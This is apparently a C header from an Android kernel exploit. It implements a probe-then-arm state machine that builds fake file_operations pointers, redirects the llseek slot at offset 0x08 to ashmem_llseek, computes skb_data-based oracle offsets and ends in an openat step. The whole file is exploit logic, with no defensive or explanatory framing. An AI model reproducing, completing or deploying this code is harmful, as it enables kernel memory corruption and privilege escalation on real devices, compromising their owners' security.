#ifndef V114_LOGIC_H
#define V114_LOGIC_H

#include <stdint.h>
#include <string.h>

#define SLIDE_V114_FOPS_LLSEEK_OFF 0x08

enum slide_v114_stage {
  SLIDE_V114_STAGE_PROBE = 0,
  SLIDE_V114_STAGE_ARM = 1,
};

enum slide_v114_event {
  SLIDE_V114_EV_PROBE_HIT = 0,
  SLIDE_V114_EV_PROBE_MISS = 1,
  SLIDE_V114_EV_ARM_HIT = 2,
  SLIDE_V114_EV_ARM_MISS = 3,
};

enum slide_v114_action {
  SLIDE_V114_ACT_PARK = 0,
  SLIDE_V114_ACT_FIRE_PROBE = 1,
  SLIDE_V114_ACT_FIRE_ARM = 2,
  SLIDE_V114_ACT_OPENAT = 3,
};

struct slide_v114_shape {
  uint64_t pc;
  uint64_t right;
  uint64_t left;
};

static inline struct slide_v114_shape slide_v114_shape_for(
    const char *shape_tgt, uint64_t fake_fops, uint64_t slot,
    uint64_t probe_scratch, uint64_t probe_mark_delta) {
  struct slide_v114_shape s;
  if (shape_tgt && strcmp(shape_tgt, "probe") == 0) {
    s.pc = probe_scratch;
    s.right = 0;
    s.left = fake_fops + probe_mark_delta;
  } else if (shape_tgt && strcmp(shape_tgt, "repair") == 0) {
    s.pc = probe_scratch;
    s.right = 0;
    s.left = slot;
  } else {
    s.pc = fake_fops;
    s.right = slot;
    s.left = 0;
  }
  return s;
}

static inline enum slide_v114_action slide_v114_start(int twostage) {
  return twostage ? SLIDE_V114_ACT_FIRE_PROBE : SLIDE_V114_ACT_FIRE_ARM;
}

static inline enum slide_v114_action slide_v114_next(
    enum slide_v114_stage stage, enum slide_v114_event ev, int probe_only) {
  if (probe_only) {
    return SLIDE_V114_ACT_PARK;
  }
  switch (stage) {
    case SLIDE_V114_STAGE_PROBE:
      if (ev != SLIDE_V114_EV_PROBE_HIT) {
        return SLIDE_V114_ACT_PARK;
      }
      return SLIDE_V114_ACT_FIRE_ARM;
    case SLIDE_V114_STAGE_ARM:
      if (ev != SLIDE_V114_EV_ARM_HIT) {
        return SLIDE_V114_ACT_PARK;
      }
      return SLIDE_V114_ACT_OPENAT;
    default:
      return SLIDE_V114_ACT_PARK;
  }
}

struct slide_v114_oracle {
  uint64_t marker;
  size_t marker_off;
  size_t stream_off;
};

static inline struct slide_v114_oracle slide_v114_oracle_for(
    int probe, uint64_t probe_scratch, uint64_t slot, size_t probe_mark_off,
    size_t arm_mark_off, long skb_data_delta) {
  struct slide_v114_oracle o;
  o.marker = probe ? probe_scratch : slot;
  o.marker_off = probe ? probe_mark_off : arm_mark_off;
  o.stream_off = o.marker_off + (size_t)(-skb_data_delta);
  return o;
}

static inline uint64_t slide_v114_llseek_target(uint64_t fake_fops) {
  return fake_fops + SLIDE_V114_FOPS_LLSEEK_OFF;
}

static inline uint64_t slide_v114_llseek_value(uint64_t ashmem_llseek) {
  return ashmem_llseek;
}

#endif
